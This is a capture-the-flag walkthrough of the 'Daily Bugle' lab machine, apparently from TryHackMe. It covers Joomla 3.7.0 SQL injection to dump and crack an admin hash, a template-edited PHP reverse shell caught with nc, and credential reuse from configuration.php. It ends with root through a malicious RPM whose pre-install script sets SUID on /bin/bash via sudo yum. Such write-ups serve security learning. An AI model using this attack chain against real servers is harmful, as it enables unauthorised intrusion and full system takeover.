## Daily Buggle

> Linux machine

`export ip=10.10.133.121`
----------------------------------------

### Recon

#### Nmap

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/dailybuggle]
└─$ nmap -sC -sV -oN nmap/initial $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-12 21:00 IST
Nmap scan report for 10.10.133.121
Host is up (0.18s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
3306/tcp open  mysql   MariaDB (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.36 seconds
```

#### Directory bruteforce

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/dailybuggle]
└─$ feroxbuster -u http://10.10.133.121/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.133.121/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       24w      202c http://10.10.133.121/logs
404      GET        7l       24w      210c http://10.10.133.121/installation
404      GET        7l       24w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        8l       22w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       20w      238c http://10.10.133.121/language => http://10.10.133.121/language/
301      GET        7l       20w      235c http://10.10.133.121/cache => http://10.10.133.121/cache/
301      GET        7l       20w      233c http://10.10.133.121/tmp => http://10.10.133.121/tmp/
301      GET        7l       20w      237c http://10.10.133.121/layouts => http://10.10.133.121/layouts/
301      GET        7l       20w      238c http://10.10.133.121/includes => http://10.10.133.121/includes/
301      GET        7l       20w      239c http://10.10.133.121/libraries => http://10.10.133.121/libraries/
301      GET        7l       20w      237c http://10.10.133.121/plugins => http://10.10.133.121/plugins/
301      GET        7l       20w      240c http://10.10.133.121/components => http://10.10.133.121/components/
301      GET        7l       20w      243c http://10.10.133.121/administrator => http://10.10.133.121/administrator/
301      GET        7l       20w      233c http://10.10.133.121/bin => http://10.10.133.121/bin/
301      GET        7l       20w      236c http://10.10.133.121/images => http://10.10.133.121/images/
301      GET        7l       20w      233c http://10.10.133.121/cli => http://10.10.133.121/cli/
301      GET        7l       20w      242c http://10.10.133.121/plugins/user => http://10.10.133.121/plugins/user/
200      GET        0l        0w        0c http://10.10.133.121/plugins/user/contactcreator/contactcreator.php
200      GET        0l        0w        0c http://10.10.133.121/administrator/modules/mod_menu/helper.php
200      GET       39l       74w     1300c http://10.10.133.121/administrator/modules/mod_title/mod_title.xml
200      GET        0l        0w        0c http://10.10.133.121/administrator/modules/mod_version/mod_version.php
200      GET        0l        0w        0c http://10.10.133.121/administrator/modules/mod_title/mod_title.php
200      GET       73l      111w     2203c http://10.10.133.121/administrator/modules/mod_custom/mod_custom.xml
200      GET        0l        0w        0c http://10.10.133.121/administrator/modules/mod_custom/mod_custom.php
200      GET        0l        0w        0c http://10.10.133.121/plugins/user/profile/profile.php
301      GET        7l       20w      237c http://10.10.133.121/modules => http://10.10.133.121/modules/
301      GET        7l       20w      251c http://10.10.133.121/administrator/modules => http://10.10.133.121/administrator/modules/
200      GET      308l      384w     9223c http://10.10.133.121/plugins/user/profile/profile.xml
200      GET        0l        0w        0c http://10.10.133.121/plugins/user/joomla/joomla.php
200      GET       60l       98w     1830c http://10.10.133.121/plugins/user/joomla/joomla.xml
301      GET        7l       20w      244c http://10.10.133.121/plugins/search => http://10.10.133.121/plugins/search/
200      GET        0l        0w        0c http://10.10.133.121/administrator/modules/mod_submenu/mod_submenu.php
301      GET        7l       20w      248c http://10.10.133.121/administrator/help => http://10.10.133.121/administrator/help/
200      GET      108l      150w     3104c http://10.10.133.121/administrator/modules/mod_stats_admin/mod_stats_admin.xml
200      GET        0l        0w        0c http://10.10.133.121/administrator/modules/mod_latest/mod_latest.php
200      GET        0l        0w        0c http://10.10.133.121/administrator/modules/mod_latest/helper.php
200      GET        0l        0w        0c http://10.10.133.121/administrator/modules/mod_multilangstatus/mod_multilangstatus.php
200      GET      242l      659w     9259c http://10.10.133.121/
301      GET        7l       20w      245c http://10.10.133.121/layouts/plugins => http://10.10.133.121/layouts/plugins/
301      GET        7l       20w      243c http://10.10.133.121/libraries/cms => http://10.10.133.121/libraries/cms/
301      GET        7l       20w      261c http://10.10.133.121/administrator/modules/mod_login => http://10.10.133.121/administrator/modules/mod_login/
301      GET        7l       20w      262c http://10.10.133.121/administrator/modules/mod_status => http://10.10.133.121/administrator/modules/mod_status/
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/help/help.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/layout/layout.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/layout/base.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/layout/file.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/layout/helper.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/pagination/object.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/pagination/pagination.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/module/helper.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/router/router.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/router/site.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/installer/script.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/installer/installer.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/language/associations.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/language/multilang.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/class/loader.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/installer/manifest.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/menu/menu.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/installer/helper.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/installer/extension.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/menu/site.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/pathway/site.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/menu/item.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/installer/adapter.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/pathway/pathway.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/menu/administrator.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/error/page.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/library/helper.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/jquery.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/html.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/form.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/behavior.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/rules.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/select.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/date.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/tel.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/bootstrap.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/sliders.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/links.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/dropdown.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/tag.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/searchtools.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/application/helper.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/contentlanguage.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/content.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/response/json.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/application/cms.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/application/site.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/jgrid.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/application/administrator.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/access.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/menu.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/tabs.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/email.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/search/helper.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/icons.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/grid.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/number.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/category.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/sortablelist.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/user.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/batch.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/formbehavior.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/string.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/actionsdropdown.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/debug.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/list.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/captcha/captcha.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/html/sidebar.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/version/version.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/router/administrator.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/ucm/type.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/component/helper.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/authentication/helper.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/ucm/ucm.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/ucm/base.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/ucm/content.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/component/record.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/plugin/plugin.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/plugin/helper.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/helper/contenthistory.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/helper/tags.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/editor/editor.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/table/contenthistory.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/table/ucm.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/table/corecontent.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/helper/usergroups.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/table/contenttype.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/helper/media.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/helper/route.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/helper/helper.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/helper/content.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/less/less.php
301      GET        7l       20w      244c http://10.10.133.121/plugins/system => http://10.10.133.121/plugins/system/
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/toolbar/button.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/toolbar/toolbar.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/schema/changeset.php
200      GET        0l        0w        0c http://10.10.133.121/libraries/cms/schema/changeitem.php
301      GET        7l       20w      252c http://10.10.133.121/administrator/includes => http://10.10.133.121/administrator/includes/
200      GET        0l        0w        0c http://10.10.133.121/administrator/includes/framework.php
200      GET        0l        0w        0c http://10.10.133.121/administrator/includes/toolbar.php
200      GET        0l        0w        0c http://10.10.133.121/administrator/includes/helper.php
200      GET        0l        0w        0c http://10.10.133.121/administrator/includes/defines.php
200      GET        0l        0w        0c http://10.10.133.121/administrator/includes/subtoolbar.php
301      GET        7l       20w      244c http://10.10.133.121/images/banners => http://10.10.133.121/images/banners/
200      GET       17l       82w     6302c http://10.10.133.121/images/banners/osmbanner2.png
200      GET      112l      269w    17539c http://10.10.133.121/images/banners/shop-ad.jpg
^c
```

#### Joomla recon

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/dailybuggle]
└─$ joomscan -u http://10.10.43.167/          

  (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)

    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://10.10.43.167/ ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.0

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing : 
http://10.10.43.167/administrator/components
http://10.10.43.167/administrator/modules
http://10.10.43.167/administrator/templates
http://10.10.43.167/images/banners


[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://10.10.43.167/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://10.10.43.167/robots.txt 

Interesting path found from robots.txt                                                                                                                       
http://10.10.43.167/joomla/administrator/                                                                                                                    
http://10.10.43.167/administrator/                                                                                                                           
http://10.10.43.167/bin/                                                                                                                                     
http://10.10.43.167/cache/                                                                                                                                   
http://10.10.43.167/cli/                                                                                                                                     
http://10.10.43.167/components/                                                                                                                              
http://10.10.43.167/includes/                                                                                                                                
http://10.10.43.167/installation/                                                                                                                            
http://10.10.43.167/language/                                                                                                                                
http://10.10.43.167/layouts/                                                                                                                                 
http://10.10.43.167/libraries/                                                                                                                               
http://10.10.43.167/logs/                                                                                                                                    
http://10.10.43.167/modules/                                                                                                                                 
http://10.10.43.167/plugins/                                                                                                                                 
http://10.10.43.167/tmp/                                                                                                                                     


[+] Finding common backup files name                                                                                                                         
[++] Backup files are not found                                                                                                                              

[+] Finding common log files name                                                                                                                            
[++] error log is not found                                                                                                                                  

[+] Checking sensitive config.php.x file                                                                                                                     
[++] Readable config files are not found                                                                                                                     


Your Report : reports/10.10.43.167/                                                                                                                          
```

Checking for exploits

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/dailybuggle]
└─$ searchsploit joomla 3.7.0
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Joomla! 3.7.0 - 'com_fields' SQL Injection                                                                                 | php/webapps/42033.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                                                              | php/webapps/43488.txt
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

#### Joomla exploit

Vulnerable to **SQLI** - use publicly avalaible exploit scripts - [Found here](https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py)

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/dailybuggle]
└─$ python joomblah.py --help                                                                                                                                
usage: joomblah.py [-h] url

Jooma Exploit

positional arguments:
  url         Base URL for Joomla site

options:
  -h, --help  show this help message and exit

┌──(edith🛸HackBox)-[~/pwn/vuln_machines/dailybuggle]
└─$ python joomblah.py http://10.10.43.167/

    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

Checking internet found the hash is bcrypt

![](/home/edith/pwn/vuln_machines/dailybuggle/001.png)

Crack the hash using John

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/dailybuggle]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (?)     
1g 0:00:02:33 DONE (2024-05-14 18:46) 0.006529g/s 306.0p/s 306.0c/s 306.0C/s warden..setsuna
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Login to the joomla administrator portal

![](/home/edith/pwn/vuln_machines/dailybuggle/002.png)

### Initial access

> you can get rce easily in joomla by editing the code of template by going to Extension-->Templates-->Templates - select any templates and replace with php reverse shell code

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/dailybuggle]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.17.49.246] from (UNKNOWN) [10.10.43.167] 49278
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 09:25:27 up 53 min,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ whoami
whoami
apache
```

Stabilizing shell

```
sh-4.2$ python --version
python --version
Python 2.7.5
sh-4.2$ python -c "import pty; pty.spawn('/bin/bash')"
python -c "import pty; pty.spawn('/bin/bash')"
bash-4.2$ export TERM=xterm
export TERM=xterm
bash-4.2$ ^Z
[1]+  Stopped                 nc -nvlp 4444

┌──(edith🛸HackBox)-[~/pwn/vuln_machines/dailybuggle]
└─$ stty raw -echo; fg
nc -nvlp 4444

bash-4.2$ 
```

We don't have access to user jjameson directory - Need to escalate our privilegs

Check for juicy information - Roam around direcotry for useful information (OR) use privilege escalation script like linpeas

```
bash-4.2$ cat configuration.php 
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'The Daily Bugle';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'root';
        public $password = 'nv5uz9r3ZEDzVjNu';
        public $db = 'joomla';
        public $dbprefix = 'fb9j5_';
        public $live_site = '';
        public $secret = 'UAMBRWzHO3oFPmVC';
        public $gzip = '0';
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
        public $ftp_host = '127.0.0.1';
        public $ftp_port = '21';
        public $ftp_user = '';
        public $ftp_pass = '';
        public $ftp_root = '';
        public $ftp_enable = '0';
        public $offset = 'UTC';
        public $mailonline = '1';
        public $mailer = 'mail';
        public $mailfrom = 'jonah@tryhackme.com';
        public $fromname = 'The Daily Bugle';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = '0';
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = '25';
        public $caching = '0';
        public $cache_handler = 'file';
        public $cachetime = '15';
        public $cache_platformprefix = '0';
        public $MetaDesc = 'New York City tabloid newspaper';
        public $MetaKeys = '';
        public $MetaTitle = '1';
        public $MetaAuthor = '1';
        public $MetaVersion = '0';
        public $robots = '';
        public $sef = '1';
        public $sef_rewrite = '0';
        public $sef_suffix = '0';
        public $unicodeslugs = '0';
        public $feed_limit = '10';
        public $feed_email = 'none';
        public $log_path = '/var/www/html/administrator/logs';
        public $tmp_path = '/var/www/html/tmp';
        public $lifetime = '15';
        public $session_handler = 'database';
        public $shared_session = '0';
}
bash-4.2$ 
```

![](/home/edith/pwn/vuln_machines/dailybuggle/003.png)

Use this information to login to jjameson user

```
bash-4.2$ su jjameson                                                                                                                                        
Password: 
[jjameson@dailybugle html]$ 
[jjameson@dailybugle html]$ whoami
jjameson
```

Now we have elevated privileges

### Privilege escalation

Check for potiental privilege escalation vectors (OR) use privilege escalation script like linpeas

```
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

> Here, user jjameson is allowed to **run yum with root priviliges with nopasswd set**

Try creating a rpm package with FPM package management utility and install it with yum - Based on [gtfobins](https://gtfobins.github.io/gtfobins/yum/) 

- Create the direcrtory and add the files need to be in rom package
- Create oneliner shell script which helps in escalaitng our privileges (Here, I set SUID bit to bash)
- Create the rpm package with the help of FPM **_[use fpm -h for help]_**
    -s is input, directory type (i.e shellpack - given at end)
    -t is output, rpm package
    -n is name of package (pwnshell)
    --before-install <script to run before install> (i.e shell.sh)

```
[jjameson@dailybugle ~]$ ls -l /bin/bash
-rwxr-xr-x. 1 root root 964600 Aug  8  2019 /bin/bash
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/dailybuggle]
└─$ mkdir shellpack 
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/dailybuggle]
└─$ cd shellpack
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/dailybuggle/shellpack]
└─$ printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/dailybuggle]
└─$ fpm -s dir -t rpm -n pwnshell --before-install shellpack/shell.sh shellpack/
Created package {:path=>"pwnshell-1.0-1.x86_64.rpm"}
```

- Transfer the package to victim machine
- Install it 

```
[jjameson@dailybugle ~]$ sudo yum install -y pwnshell-1.0-1.x86_64.rpm
Loaded plugins: fastestmirror
Examining pwnshell-1.0-1.x86_64.rpm: pwnshell-1.0-1.x86_64
Marking pwnshell-1.0-1.x86_64.rpm to be installed
Resolving Dependencies
--> Running transaction check
---> Package pwnshell.x86_64 0:1.0-1 will be installed
--> Finished Dependency Resolution

Dependencies Resolved

================================================================================
 Package         Arch          Version      Repository                     Size
================================================================================
Installing:
 pwnshell        x86_64        1.0-1        /pwnshell-1.0-1.x86_64         31  

Transaction Summary
================================================================================
Install  1 Package

Total size: 31  
Installed size: 31  
Downloading packages:
Running transaction check
Running transaction test
Transaction test succeeded
Running transaction
  Installing : pwnshell-1.0-1.x86_64                                        1/1 
  Verifying  : pwnshell-1.0-1.x86_64                                        1/1 

Installed:
  pwnshell.x86_64 0:1.0-1                                                       

Complete!
[jjameson@dailybugle ~]$ ls -l /bin/bash
-rwsr-sr-x. 1 root root 964600 Aug  8  2019 /bin/bash
bash-4.2# whoami
root
```

Sucessfully pwned!